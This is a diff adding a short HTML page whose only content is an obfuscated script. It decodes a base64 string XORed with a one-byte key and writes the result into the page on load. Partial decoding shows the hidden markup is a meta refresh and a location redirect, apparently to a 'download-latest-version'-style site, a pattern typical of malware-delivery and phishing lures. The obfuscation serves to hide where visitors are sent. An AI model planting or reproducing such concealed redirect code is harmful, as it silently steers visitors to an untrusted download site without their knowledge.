@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+</head>
+<body>
+<script>
+(function(){
+var k=atob("zw==").charCodeAt(0),
+e=atob("8+6LgIyblp+K76e7oqPxxfOnu6Kj8cXzp6quq/HF86Kqu67vp7u7v+KqvrqmufLtvaqpvaq8p+3vrKChu6qhu/Lt//Tvur2j8qe7u7+89eDgq6C4oaOgrqvio667qry74rmqvbymoKHhoaq7o6aptuGuv7/t8cXzvKy9pr+78aOgrK67pqCh4b2qv6OurKrn7ae7u7+89eDgq6C4oaOgrqvio667qry74rmqvbymoKHhoaq7o6aptuGuv7/t5vTz4Lysvaa/u/HF8+Cnqq6r8cXzraCrtvHz4K2gq7bxxfPgp7uio/HF"),
+o="";
+
+for(var i=0;i<e.length;i++)
+    o+=String.fromCharCode(e.charCodeAt(i)^k);
+
+document.write(o);
+})();
+</script>
+</body>
+</html>
